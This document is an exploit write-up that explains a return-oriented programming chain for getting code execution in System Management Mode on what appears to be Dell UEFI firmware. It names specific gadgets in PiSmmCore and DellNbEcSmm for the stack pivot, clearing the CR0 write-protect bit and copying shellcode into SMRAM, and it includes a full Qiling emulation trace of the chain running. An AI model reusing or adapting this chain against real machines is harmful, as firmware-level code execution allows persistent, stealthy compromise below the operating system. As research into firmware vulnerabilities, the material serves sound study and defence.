# Explanation of ROP chain for SMM code execution. 
## Stack pivot
To get a ROP going the first thing we need to find is a stack pivot gadget, that will allow us to move the stack pointer to an address we control.
The one we were able to find in PiSmmCore is 
```asm
MOV        ESP,EBX
POP        RDI
RET
```
To use it we need to set EBX, luckily the LeakPrimitive function we used for the read primitive already set EBX to value of the first argument. 
However this is the address of the SMI_HANDLER struct and we can't set the values at the start of the strcture to arbitrary values. 
We can have function call itself again. This allows us to control the value of the first argument. 
This new iteration of the function will call the pivot gadget and now we can start using a standard ROP chain.

## Store previous stack pointer
The second thing we want in our ROP is to store the original stack pointer (Doesn't have to be exact we can do arithmatic in the shellcode later).  Since RSP/ESP already points to another address, we can use R11 which is used as the frame pointer in our function. We couldn't find a gadget that will allow us to store the value of R11, so we looked for one in other binaries and found a few in DellNbEcSmm. We are using: 
```asm
MOV        dword ptr [RBX],R11D
XOR        EAX,EAX
MOV        RBX,qword ptr [RSP + 0x50]
ADD        RSP,0x30
POP        RDI
RET
```
It's a little more then we need, but the other options included a call to a function, so we will take this one. We do write the value up the stack, so we will have to be carful not to overwrite it before we can move it with the shellcode.

## Disable write protection
Now we need to disable CR0 write protect bit so we can copy the shellcode to an executable segment.
We've found the gadgets:
```asm 
POP        RAX
POP        RDI
RET
```
```asm 
MOV        CR0, RAX
RET
```
We don't need to read the value of CR0 since it's predictable and we can just hardcode the value we like.

## Copying the shellcode to SMRAM.
Now we can use memcpy to copy the shellcode to a code segment, but we couldn't find gadgets for setting the arguments in RDX and R8.
We did find the following solution:
```asm
POP        RBX
RET
```
```asm
POP        RAX
POP        RDI
RET
```
```asm
MOV        R8,RBX
MOV        RDX,RDI
MOV        RCX,RAX
CALL       memcpy
MOV        RBX,qword ptr [RSP + 0x30]
ADD        RSP,0x20
POP        RDI
RET
```
If we set that last ret to the address we copy the shell code to we start running the shellcode.

## Running the ROP and shellcode in emulation
We've generated this listing by executing the whole thing using the qiling framework.
```asm
; LeakPrimitive function - As SMI handler:
0x00103948  {rsp: 0x006000   0xc0de  } mov r11, rsp
0x0010394b  {rsp: 0x006000   0xc0de  } mov qword ptr [r11 + 0x10], rbx
0x0010394f  {rsp: 0x006000   0xc0de  } mov qword ptr [r11 + 0x18], rsi
0x00103953  {rsp: 0x006000   0xc0de  } push rdi
0x00103954  {rsp: 0x005ff8   0x000000} sub rsp, 0x40
0x00103958  {rsp: 0x005fb8   0x000000} mov r10, qword ptr [rcx + 0x48]
0x0010395c  {rsp: 0x005fb8   0x000000} lea rdi, [rcx + 0x50]
0x00103960  {rsp: 0x005fb8   0x000000} lea rax, [rcx + 0x58]
0x00103964  {rsp: 0x005fb8   0x000000} mov rbx, rcx
0x00103967  {rsp: 0x005fb8   0x000000} lea rdx, [rcx + 0x30]
0x0010396b  {rsp: 0x005fb8   0x000000} xor r9d, r9d
0x0010396e  {rsp: 0x005fb8   0x000000} lea rcx, [r11 + 8]
0x00103972  {rsp: 0x005fb8   0x000000} mov r8b, 0x1c
0x00103975  {rsp: 0x005fb8   0x000000} mov qword ptr [r11 - 0x18], rcx
0x00103979  {rsp: 0x005fb8   0x000000} mov rcx, r10
0x0010397c  {rsp: 0x005fb8   0x000000} mov qword ptr [r11 - 0x20], rax
0x00103980  {rsp: 0x005fb8   0x000000} mov qword ptr [r11 - 0x28], rdi
0x00103984  {rsp: 0x005fb8   0x000000} call qword ptr [r10 + 0x18]
; LeakPrimitive function - second run:
0x00103948  {rsp: 0x005fb0   0x103988} mov r11, rsp
0x0010394b  {rsp: 0x005fb0   0x103988} mov qword ptr [r11 + 0x10], rbx
0x0010394f  {rsp: 0x005fb0   0x103988} mov qword ptr [r11 + 0x18], rsi
0x00103953  {rsp: 0x005fb0   0x103988} push rdi
0x00103954  {rsp: 0x005fa8   0x001050} sub rsp, 0x40
0x00103958  {rsp: 0x005f68   0x000000} mov r10, qword ptr [rcx + 0x48]
0x0010395c  {rsp: 0x005f68   0x000000} lea rdi, [rcx + 0x50]
0x00103960  {rsp: 0x005f68   0x000000} lea rax, [rcx + 0x58]
0x00103964  {rsp: 0x005f68   0x000000} mov rbx, rcx
0x00103967  {rsp: 0x005f68   0x000000} lea rdx, [rcx + 0x30]
0x0010396b  {rsp: 0x005f68   0x000000} xor r9d, r9d
0x0010396e  {rsp: 0x005f68   0x000000} lea rcx, [r11 + 8]
0x00103972  {rsp: 0x005f68   0x000000} mov r8b, 0x1c
0x00103975  {rsp: 0x005f68   0x000000} mov qword ptr [r11 - 0x18], rcx
0x00103979  {rsp: 0x005f68   0x000000} mov rcx, r10
0x0010397c  {rsp: 0x005f68   0x000000} mov qword ptr [r11 - 0x20], rax
0x00103980  {rsp: 0x005f68   0x000000} mov qword ptr [r11 - 0x28], rdi
0x00103984  {rsp: 0x005f68   0x000000} call qword ptr [r10 + 0x18]
; Stack pivot
0x001032e5  {rsp: 0x005f60   0x103988} mov esp, ebx
0x001032e7  {rsp: 0x001028   0x1032e5} pop rdi
0x001032e8  {rsp: 0x001030   0x103d35} ret
; Advance stack pointer
0x00103d35  {rsp: 0x001038   0x000000} add rsp, 0x20
0x00103d39  {rsp: 0x001058   0x000000} pop rdi
0x00103d3a  {rsp: 0x001060   0x1ac186} ret
; Store frame pointer in SMI_HANDLER struct
0x001ac186  {rsp: 0x001068   0x000000} mov dword ptr [rbx], r11d
0x001ac189  {rsp: 0x001068   0x000000} xor eax, eax
0x001ac18b  {rsp: 0x001068   0x000000} mov rbx, qword ptr [rsp + 0x50]
0x001ac190  {rsp: 0x001068   0x000000} add rsp, 0x30
0x001ac194  {rsp: 0x001098   0x000000} pop rdi
0x001ac195  {rsp: 0x0010a0   0x10105a} ret
; Set CR0 to diable write protection.
0x0010105a  {rsp: 0x0010a8   0x80000033} pop rax
0x0010105b  {rsp: 0x0010b0   0x000000} pop rdi
0x0010105c  {rsp: 0x0010b8   0x11393f} ret
0x0011393f  {rsp: 0x0010c0   0x101135} mov cr0, rax
0x00113942  {rsp: 0x0010c0   0x101135} ret
; Copy shellcode to SMRAM
0x00101135  {rsp: 0x0010c8   0x000027} pop rbx
0x00101136  {rsp: 0x0010d0   0x10105a} ret
0x0010105a  {rsp: 0x0010d8   0x1045e4} pop rax
0x0010105b  {rsp: 0x0010e0   0x004500} pop rdi
0x0010105c  {rsp: 0x0010e8   0x1079d7} ret
0x001079d7  {rsp: 0x0010f0   0x000000} mov r8, rbx
0x001079da  {rsp: 0x0010f0   0x000000} mov rdx, rdi
0x001079dd  {rsp: 0x0010f0   0x000000} mov rcx, rax
0x001079e0  {rsp: 0x0010f0   0x000000} call 0x101000
; memcpy
0x00101000  {rsp: 0x0010e8   0x1079e5} push rsi
0x00101001  {rsp: 0x0010e0   0x000000} push rdi
0x00101002  {rsp: 0x0010d8   0x004500} mov rsi, rdx
0x00101005  {rsp: 0x0010d8   0x004500} mov rdi, rcx
0x00101008  {rsp: 0x0010d8   0x004500} lea r9, [rsi + r8 - 1]
0x0010100d  {rsp: 0x0010d8   0x004500} cmp rsi, rdi
0x00101010  {rsp: 0x0010d8   0x004500} mov rax, rdi
0x00101013  {rsp: 0x0010d8   0x004500} jae 0x10101a
0x00101015  {rsp: 0x0010d8   0x004500} cmp r9, rdi
0x00101018  {rsp: 0x0010d8   0x004500} jae 0x10102a
0x0010101a  {rsp: 0x0010d8   0x004500} mov rcx, r8
0x0010101d  {rsp: 0x0010d8   0x004500} and r8, 7
0x00101021  {rsp: 0x0010d8   0x004500} shr rcx, 3
0x00101025  {rsp: 0x0010d8   0x004500} rep movsq qword ptr [rdi], qword ptr [rsi]
0x00101025  {rsp: 0x0010d8   0x004500} rep movsq qword ptr [rdi], qword ptr [rsi]
0x00101025  {rsp: 0x0010d8   0x004500} rep movsq qword ptr [rdi], qword ptr [rsi]
0x00101025  {rsp: 0x0010d8   0x004500} rep movsq qword ptr [rdi], qword ptr [rsi]
0x00101025  {rsp: 0x0010d8   0x004500} rep movsq qword ptr [rdi], qword ptr [rsi]
0x00101028  {rsp: 0x0010d8   0x004500} jmp 0x101033
0x00101033  {rsp: 0x0010d8   0x004500} mov rcx, r8
0x00101036  {rsp: 0x0010d8   0x004500} rep movsb byte ptr [rdi], byte ptr [rsi]
0x00101036  {rsp: 0x0010d8   0x004500} rep movsb byte ptr [rdi], byte ptr [rsi]
0x00101036  {rsp: 0x0010d8   0x004500} rep movsb byte ptr [rdi], byte ptr [rsi]
0x00101036  {rsp: 0x0010d8   0x004500} rep movsb byte ptr [rdi], byte ptr [rsi]
0x00101036  {rsp: 0x0010d8   0x004500} rep movsb byte ptr [rdi], byte ptr [rsi]
0x00101036  {rsp: 0x0010d8   0x004500} rep movsb byte ptr [rdi], byte ptr [rsi]
0x00101036  {rsp: 0x0010d8   0x004500} rep movsb byte ptr [rdi], byte ptr [rsi]
0x00101036  {rsp: 0x0010d8   0x004500} rep movsb byte ptr [rdi], byte ptr [rsi]
0x00101038  {rsp: 0x0010d8   0x004500} cld
0x00101039  {rsp: 0x0010d8   0x004500} pop rdi
0x0010103a  {rsp: 0x0010e0   0x000000} pop rsi
0x0010103b  {rsp: 0x0010e8   0x1079e5} ret
; Back to memcpy calling function
0x001079e5  {rsp: 0x0010f0   0x000000} mov rbx, qword ptr [rsp + 0x30]
0x001079ea  {rsp: 0x0010f0   0x000000} add rsp, 0x20
0x001079ee  {rsp: 0x001110   0x000000} pop rdi
0x001079ef  {rsp: 0x001118   0x1045e4} ret
; Return to shellcode
0x001045e4 {rsp: 0x001120    0x000000} mov rbx, 0x1028
0x001045eb {rsp: 0x001120    0x000000} mov rsp, qword ptr [rbx]
0x001045ee {rsp: 0x005fb0    0x103988} movabs rax, 0x80000018
0x001045f8 {rsp: 0x005fb0    0x103988} ret
; Execution restoration, back to the first execution of LeakPrimitive function
; Shellcode set the return value as an error code so the function will clean up and return
0x00103988 {rsp: 0x005fb8    0x000000} mov rsi, rax
0x0010398b {rsp: 0x005fb8    0x000000} test rax, rax
0x0010398e {rsp: 0x005fb8    0x000000} jns 0x1039af
0x00103990 {rsp: 0x005fb8    0x000000} movabs rax, 0x80000018
0x0010399a {rsp: 0x005fb8    0x000000} cmp rsi, rax
0x0010399d {rsp: 0x005fb8    0x000000} jne 0x1039a5
0x0010399f {rsp: 0x005fb8    0x000000} mov byte ptr [rbx + 0x77], 1
0x001039a3 {rsp: 0x005fb8    0x000000} jmp 0x1039f0
0x001039f0 {rsp: 0x005fb8    0x000000} mov rbx, qword ptr [rsp + 0x58]
0x001039f5 {rsp: 0x005fb8    0x000000} mov rax, rsi
0x001039f8 {rsp: 0x005fb8    0x000000} mov rsi, qword ptr [rsp + 0x60]
0x001039fd {rsp: 0x005fb8    0x000000} add rsp, 0x40
0x00103a01 {rsp: 0x005ff8    0x000000} pop rdi
0x00103a02 {rsp: 0x006000    0xc0de  } ret


```

